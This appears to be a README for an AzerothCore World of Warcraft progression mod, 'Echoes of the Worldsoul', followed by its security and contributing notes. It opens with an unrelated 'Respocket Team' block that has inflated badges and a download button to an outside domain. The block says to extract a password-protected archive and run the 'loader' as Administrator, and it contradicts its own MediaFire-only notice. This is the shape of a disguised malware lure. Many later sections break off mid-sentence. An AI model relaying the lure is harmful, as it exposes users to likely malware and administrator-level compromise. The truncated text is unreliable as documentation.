<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# Echoes of the Worldsoul

<p align="center">
  <img src="docs/images/echoes-of-the-worldsoul-header.png" alt="Echoes of the Worldsoul" width="100%">
</p>

## Start Here

Server operators must use this order: **discover → ALE compatibility dry-run →
ALE compatibility apply → build worldserver → install → verify**. Run the
commands from the extracted Echoes release directory. The compatibility patch
is revision-locked and an unknown ALE revision is refused rather than modified.
## Joining an Echoes Server

Running an Echoes server is the technical part. Playing on one shouldn't be.

If you're joining someone else's Echoes-enabled server, you do **not** need
AzerothCore, MySQL, `mod-ale`, Docker, or this project's installer. You need:

1. Your own compatible **WoW 3.3.5a (build 12340)** client — the same one
   you'd use for any AzerothCore-based server.
2. The small **Echoes client package** the server provides you: the
   `EchoesOfTheWorldsoulBridge` AddOn (a normal WoW AddOn — the same kind
   you'd install for any other UI mod) and a `patch-E.MPQ` file (a small,
   additive data patch — the client's own patch system, not a modified
## What Is Echoes?

Echoes of the Worldsoul is a solo/self-paced progression layer that sits on
top of normal WotLK gameplay, built around one core idea: **your gear has a
history, and history is worth something.**

- **Attunement** — every piece of gear you fight with tracks its own
  progress. Full attunement is permanent, per-account, and survives moving
  the item between your characters.
- **Essence** — the currency attunement, kills, bosses, quests, and PvP
  earn you. It persists across sessions and is spent on permanent upgrades.
- **Mastery** — ranks up from spent Essence, permanently increasing how much
  stat power your attuned gear grants you.
- **The Crucible** — 18 categories of permanent, account-wide investment
  (Life Leech, Spell Mitigation, XP rate, and more).
- **The Attunement Rack** — up to 20 slots that let stored gear keep
  attuning passively without being equipped.
- **The Legacy Forge** — dissolve a fully-attuned item you no longer need
  into currency instead of letting it sit dead in your bags.
- **World Threat** — an optional, voluntary risk/reward challenge mode;
  higher threat means bigger rewards and real consequences for dying, not
  artificial stat inflation.
- **Visage** — cosmetic aura/flash effects that reflect how far your
  attunement has come.
- **Chaos Mode** — an optional character setting that expresses supported
  health, combat, and reference values in a larger logical unit system while
  leaving native Wrath combat and relative power relationships authoritative.

None of this requires grouping, a guild, or any other player — it's built
for a self-paced or solo-friendly server, though nothing stops it from
running on a populated one.

---

## What does Echoes install?

Echoes has both a server side and a client side. Nobody installs all of
it — players install the two client-side rows, server owners install the
rest.

| Piece | Who installs it | Where it goes | What it does |
|---|---|---|---|
| `EchoesOfTheWorldsoulBridge` (Client Companion AddOn) | Players | `Interface\AddOns\` in the WoW client | Ordinary WoW AddOn — the graphical panels, tooltips, and minimap button |
| `patch-E.MPQ` (client data patch) | Players | `Data\` in the WoW client | An additive **MPQ** (the WoW client's own archive/patch format) containing just the two custom item records Echoes needs — not a modified game executable, not a full client |
| `mod-echoes-stats` (C++ module) | Server owners | `modules/` in the AzerothCore source tree | Required. Compiled into the server; applies attunement/Crucible stat effects at the engine level |
## What's New in 2.0?

If you saw Echoes at `v1.6.0-rc1`, the short version: **the interface,
the Playerbots story, and the install experience are all different now.**
This isn't a new project — it's the same design, substantially
productionized and hardened.

| | |
|---|---|
| **New** | Production **Client Companion** graphical AddOn (previously chat-command-only); optional **Playerbots integration** (`mod-echoes-playerbots`); the **installer** (`installer/`) with tracked install/verify/upgrade/repair/uninstall; the `patch-E.MPQ` client-patch namespace with automatic migration from the old `patch-4.MPQ`; a dedicated **Accessibility** settings panel; split Docker/DML-style runtime layout support (`--lua-root`/`--config-root`) |
| **Rewritten / Expanded** | Stat/Crucible-effect application moved from Lua-only approximation into `mod-echoes-stats`, a compiled, engine-level module — now a required component, not optional |
| **Productionized / Hardened** | SQL schema evolution consolidated into idempotent, guarded migrations (`sql/schema/`); a real clean-room C++ compile matrix (Playerbots present *and* absent, both actually built and linked, not inferred); a live DML-compatible deployment certification end to end |

Everything above did not appear newly invented in 2.0 in every case — some
of it (like Playerbots integration and the stat engine) existed in earlier
form during the v1.6-era development track and has now been compiled,
tested, and shipped as part of the public package for the first time. See
## What's New in 2.1?

Echoes 2.1.0 adds optional **Chaos Mode**. Chaos Power is derived from a
character's current permanent Echoes development and displayed with a
base-1000 Magnitude rank. When enabled, supported stock health numbers,
floating combat outcomes, the live Combat Log, weapon references, and bounded
fixed spell/aura/proc references use one coherent viewer-side scale.

Chaos does **not** give creatures literal billion-point native health, widen
packets, change combat resolution, add a currency, or normalize every enemy to
the player. Earlier creatures still become easier; normal mobs remain below
elites, dungeon bosses, and raid bosses. **Getting stronger must not make
Azeroth less worth playing.**

Settings contains the Chaos Numbers toggle; Progression shows Chaos Power,
Magnitude, and rank name. No Dashboard destination or new navigation was
## Playerbots Support

**Playerbots is entirely optional.** Echoes does not require it, and every
system above works identically with zero Playerbots dependency.

`mod-echoes-playerbots` is the optional integration layer that bridges
Echoes' attunement/progression systems to Playerbots-controlled characters
(awareness, retention, Rack interaction, bounded progression spending, and
explicitly gated Dissolution). Every Playerbots-dependent symbol it uses is
guarded by `#ifdef MOD_PLAYERBOTS` in the source, so the module compiles to
an inert no-op when Playerbots isn't present in your `modules/` tree — this
isn't a design claim, it's been proven by **actually compiling the module
in both configurations** (Playerbots present and Playerbots absent), not
inferred from reading the source.

Compatibility evidence for this release:

- Real clean-room builds completed with Playerbots present (475 real
  Playerbots engine symbols linked into the resulting binary) and with
  Playerbots absent (zero engine symbols, module still fully functional).
- Historically, this integration ran live in production at approximately
  **1,700–2,000 concurrent bots** over multiple days, with no Echoes
  compatibility rollback recorded.
- Current 2.0 source, build, and installer package paths were
  independently re-verified this release.

This is **tested against the documented AzerothCore/Playerbots environment
used for this release** — it is not a claim of support for every Playerbots
fork or configuration in existence.

---

## Dad's MMO Lab / DML Compatibility

**DML-compatible / tested with Dad's MMO Lab-style environments.** This is
a compatibility statement, not an endorsement, an affiliation, or an
official Dad's MMO Lab module.

Dad's MMO Lab-style deployments commonly run AzerothCore in Docker with a
split layout: the C++ module source lives at one root, while the actual
running server's Lua scripts and config live under a separate runtime
distribution root (bind-mounted, not the checkout itself). The installer
supports this directly with explicit `--lua-root`/`--config-root` flags
(auto-suggested by `echoes discover`) — see
## Client Companion

The Client Companion (`EchoesOfTheWorldsoulBridge`) is one of the largest
visible changes since `v1.6.0-rc1`: a full graphical AddOn, not a skin over
chat commands. It's a versioned client/server protocol backed by live
server-side Echoes state, with dedicated panels for:

Dashboard · Progression · Talents · World Threat · Crucible · Attunement
Rack · Legacy Forge · Visage · Codex/Search · Settings · Accessibility

The Dashboard hero image near the top of this README is this AddOn — here's
a closer look at a few of its other panels:

<table>
<tr>
<td width="50%">
<img src="docs/images/client-companion/talents.png" alt="Worldsoul Talents panel">
<br><em>Worldsoul Talents</em>
</td>
<td width="50%">
<img src="docs/images/client-companion/crucible.png" alt="The Crucible panel">
<br><em>The Crucible</em>
</td>
</tr>
<tr>
<td width="50%">
<img src="docs/images/client-companion/attunement-rack.png" alt="Attunement Rack panel">
<br><em>Attunement Rack</em>
</td>
<td width="50%">
<img src="docs/images/client-companion/legacy-forge.png" alt="Legacy Forge panel">
<br><em>Legacy Forge</em>
</td>
</tr>
<tr>
<td width="50%">
<img src="docs/images/client-companion/visage.png" alt="Worldsoul Visage panel">
<br><em>Visage</em>
</td>
<td width="50%">
<img src="docs/images/client-companion/world-threat.png" alt="World Threat panel">
<br><em>World Threat</em>
</td>
</tr>
</table>

All 12 panels, in order, with short descriptions:
## Installing Echoes on Your Server

**This section is for server owners/operators building and running Echoes,
not for players joining a server that already has it — see
## Upgrading from v1.6.0-rc1 / Older Echoes Installs

The installer detects and handles a pre-installer legacy layout
automatically — run `install` (it adopts an existing deployment into
installer management) or `upgrade` (if a manifest already exists):

- **Legacy files are positively identified before anything is touched** —
  by content signature, never by filename alone. The old dev-only
  `ap_gm_aether.lua` and the legacy `mod-attunement-plus/` module (if
  present) are retired only once identified this way, and only after
  their replacements are already installed.
- **The old `patch-4.MPQ` client patch is migrated to the new `patch-E.MPQ`
  namespace** automatically, once positively identified as Echoes' own
  prior output — never touched if it can't be proven.
- **Everything is backed up before being replaced.** Nothing is deleted
  first "just in case" — see `echoes-installer-backups/` after any run.
- **Database migrations preserve existing player/progression data.**
  `sql/schema/` is idempotent and only ever adds what's missing.

Do not manually delete old files before running the installer — let it
detect and migrate them; that's exactly what the positive-identification
step is for. This does not extend to unknown, custom-forked deployments —
the guarantee above is for a genuine prior Echoes install, not an arbitrary
modification.

---

## This Is Not a Repack

Echoes is entirely source-based. This repository includes:

Lua · SQL · C++ module source · the installer · the client AddOn · DBC
patch-generation tooling · documentation

It does **not** include, and never will:

a WoW client · Blizzard client data · a custom `Wow.exe` · AzerothCore
binaries · Playerbots source · `mod-ale` source

**No custom WoW executable and no redistributed WoW client required.**
Echoes installs an additive client package into an existing, separately
obtained, compatible 3.3.5a client — it does not claim that client is
otherwise unmodified by anything else you may have installed.

**From a player's perspective:** joining an Echoes server does not require
downloading a replacement WoW executable or a full pre-modified client. You
use your own compatible 3.3.5a client plus the small Echoes client package
(`EchoesOfTheWorldsoulBridge` + `patch-E.MPQ`) provided by the server you're
## Requirements / Compatibility

| Component | Status | Notes |
|---|---|---|
| AzerothCore 3.3.5a | Required | Source checkout, buildable with CMake — a binary-only install is not sufficient |
## Tested / Reference Environment

Echoes 2.1.4 is tested with official **ALE** commit
`9eeb1f3c47a81291548874fa4be2f4cde35e2ec3` plus the included
`CharDBDirectExecute` patch. ALE is the AzerothCore Lua Engine used by the
tested setup. **Do not substitute an older
`mod-eluna` fork** unless you know it matches your AzerothCore revision;
a stale fork is a common cause of confusing compile errors that look like
an Echoes problem but aren't.

| Component | Tested/reference project | Notes |
|---|---|---|
### Fresh-Client Item.dbc Note

The installer can automatically extract a vanilla `Item.dbc` from your
client's own stock archives (via the optional `mpyq` package). **Some real
3.3.5a MPQ variants are not fully supported by this optional extraction
path** — many retail WotLK archives use an MPQ header format `mpyq` has
incomplete support for. This is a known, documented limitation, not a
reflection of a problem with your client.

The reliable fallback: extract `DBFilesClient\Item.dbc` yourself with any
MPQ editor (e.g. Ladik's MPQ Editor), then pass
`--vanilla-dbc-path /path/to/Item.dbc`. This project does not redistribute
Blizzard's `Item.dbc` and will not link to third-party client downloads.

---

## Architecture

Six layers, each independently understandable — deliberately not blurring
"what a player installs" with "what a server owner installs":

1. **Echoes Core** (`lua_scripts/`) — the Eluna gameplay/runtime logic:
   attunement, Essence, Mastery, Crucible, Rack, Forge, World Threat,
   Visage, Chaos state/power, and the client/server protocol.
2. **Engine Integration** (`cpp_patch/mod-echoes-stats/`, required) —
   compiled, engine-level stat and Crucible-effect application.
3. **Optional Playerbots Integration** (`cpp_patch/mod-echoes-playerbots/`)
## Repository Structure

```
echoes-of-the-worldsoul/
├── installer/             Python installer core + Bash/PowerShell wrappers
│                           (install, verify, upgrade, repair, uninstall,
│                           client-package, discover) + regression tests
├── lua_scripts/            Server-side Eluna Lua scripts (28 files)
├── cpp_patch/
│   ├── mod-echoes-stats/       Required -- engine-level stat/Crucible-effect application
│   └── mod-echoes-playerbots/  Optional -- Playerbots integration, self-gated at compile time
├── sql/
│   ├── schema/             00_preflight.sql .. 90_validation.sql -- idempotent install package
│   └── data/               world_items.sql -- custom item rows (acore_world)
├── dbc_patch/              patch_item_dbc.py, mpq_writer.py, build_patch_mpq.py, tooling docs
├── client_addon/           EchoesOfTheWorldsoulBridge WoW AddOn (Client Companion)
├── docs/                   API.md, EXTENSIONS.md, PLAYER_SETUP.md, compatibility evidence ledger
├── .github/                Issue templates
├── INSTALL.md
├── CHANGELOG.md
├── RELEASE_NOTES_v2.0.0-rc1.md
├── RELEASE_NOTES_v2.1.0.md
├── RELEASE_NOTES_v2.1.1.md
├── ECHOES-2.1.8-RELEASE-NOTES.md
├── ECHOES-2.1.4-RELEASE-NOTES.md
├── LICENSE
└── README.md
```

Not included in this repository: `mod-ale` and `mod-playerbots` (both
external prerequisites — see Requirements above).

---

## Configuration

Server-runtime gameplay tuning (attunement rates, Essence rewards, Mastery
thresholds, Crucible sink caps, Rack slot costs, Forge rewards, Visage
themes) lives in `ap_core.lua`'s `AP.Config` table and the respective
`ap_*.lua` files — edit and use the supported `reload.ale` operator command,
no database change or
restart needed. C++ module settings (`EchoesStats.*`,
`EchoesPlayerbots.*`) live in `etc/modules/*.conf` and take effect on
restart. Client-side preferences (Accessibility, UI options) are stored by
the AddOn itself and never touch the server.

---

## Testing

**Developer testing only (GM-enforced):** `#aptest` runs the full regression suite — 20 suites,
214 individual tests, covering math, database, tooltip, anti-spam, quest,
aether, UI, Forge, Residue, Crucible, Visage, PvP, voice, versioning,
exploit guards, and every numbered tier's fixes. Run an individual suite
with e.g. `#aptest tier6` or `#aptest threat`. It mutates reserved database
fixtures, refuses to run without `CharDBDirectExecute`, and should not be used
as an ordinary player or production troubleshooting command.

**Installer regression (Python, disposable fixtures only):** 200+
assertions across single-root, split-root, legacy-migration, and
attack-style test files, re-run from an extracted release artifact as
part of this RC's own preparation.

**C++ module tests:** 247/247 assertions passing across the module's
standalone unit test files.

**Clean-room compile evidence:** real compiled builds with Playerbots
present and absent, not inferred.

These are separate, non-comparable test populations — see
## Compatibility Evidence

Most users won't need to read the full technical ledger. Summary of what
was independently verified for this release:

- Clean-room C++ builds with Playerbots present and absent (both actually
  compiled and linked)
- DML-style and generic-AzerothCore installer walkthroughs
- The split Docker/DML-style runtime layout fix, verified live against a
  real deployment
- A package-equivalent server built and booted from the installer's own
  output
- Client Companion package reproduction: 273/273 files byte-identical to
  a real deployed install
- Live `patch-4.MPQ` → `patch-E.MPQ` migration, verified against a real
  client
- Full live client route/action validation (login, item resolution, every
  Client Companion panel, one reversible server-backed action)
- Historical Playerbots load validation at ~1,700–2,000 concurrent bots

Full evidence, methodology, and every individual finding:
## Compatibility & Common Module Stacks

Echoes is being tested against common AzerothCore and Playerbots module
combinations rather than claiming universal module compatibility. The
matrix below distinguishes combinations that have been empirically
tested from modules that are only planned compatibility targets.

| Module | Status |
|---|---|
## Extension API

Echoes exposes `AP.API` for future dependent modules (Empire, Prestige,
## Acknowledgments

Echoes was originally inspired by the item-attunement system of the
**Synastria** WoW private server, and later by **Peloria**'s more recent
approach to permanent item-based progression. Echoes is independently
implemented from scratch for AzerothCore — its own design, database
schema, Lua architecture, and feature set. No affiliation with or
endorsement by either project is claimed. The motivation is simple: make
this style of permanent, gear-driven progression available to anyone
running their own AzerothCore environment, not just players of those
specific servers.

Developed with the assistance of **Claude** (Anthropic) as an AI pair
programmer.

Special thanks to **PRAN**, Level 80 Orc Warrior, who endured every crash,
exploit, and item-loss incident this project produced during the original
Eluna-era test campaign and is still standing — and to the many
short-lived Orc Warrior clones created, tested, and deleted in his shadow,
whose sacrifices were no less essential and whose names history does not
record.

And to **BRUS**, Level 4 Human Warrior, principal live test character of
the compatibility-hardening, Dad's MMO Lab, Playerbots, and Client
Companion era — proof that you don't need to be high level to do
important, dangerous work.

---

## License

Copyright (C) 2025-2026 vibecoder99.
Licensed under the GNU General Public License v3.0 or later. See `LICENSE`.


---

# Security Policy

Echoes of the Worldsoul is a small open-source project without a formal
security team. Reports are handled by the maintainer on a best-effort
basis.

## Reporting a Vulnerability

Please report security-relevant issues privately rather than as a public
GitHub Issue, using GitHub's
## What to Include

- The affected component/file
- Steps to reproduce, ideally against a disposable test environment
- The actual vs. expected behavior
- Do not include real credentials, even redacted examples that resemble
  a real deployment's format

## Scope

This covers Echoes' own code (Lua, C++ modules, installer, client AddOn,
SQL). It does not cover AzerothCore, Eluna/`mod-ale`, Playerbots, or your
WoW client itself — report those to their respective projects.


---

# Contributing

Echoes of the Worldsoul is a small open-source project. Contributions are
welcome; the bar is reasonable, not enterprise-grade.

## Pull Requests

- Keep PRs scoped to one change. A bug fix doesn't need surrounding
  cleanup; a small feature doesn't need a new abstraction layer.
- If you're touching `installer/`, run the existing regression tests
  (`installer/tests/`) against a disposable MySQL instance before
  submitting — never against a production database.
- If you're touching gameplay Lua, run the relevant `#aptest` suite
  in-game before submitting.
- Describe what changed and why in the PR description, not just what.


---

                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007
